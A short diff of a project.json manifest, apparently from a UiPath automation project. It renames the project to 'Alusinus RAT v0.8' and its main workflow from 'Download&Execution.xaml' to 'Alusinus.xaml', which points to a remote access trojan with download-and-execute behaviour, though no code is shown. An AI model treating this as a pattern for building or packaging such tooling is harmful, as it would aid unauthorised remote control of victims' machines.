@@ -1,14 +1,14 @@
 {
-  "name": "sample",
+  "name": "Alusinus RAT v0.8",
   "description": "Project",
-  "main": "Download&Execution.xaml",
+  "main": "Alusinus.xaml",
   "dependencies": {},
   "excludedData": [
     "Private:*",
     "*password*"
   ],
   "toolVersion": "18.2",
-  "projectVersion": "1.0.6774.29024",
+  "projectVersion": "1.0.6774.17224",
   "packOptions": {},
   "runtimeOptions": {}
 }
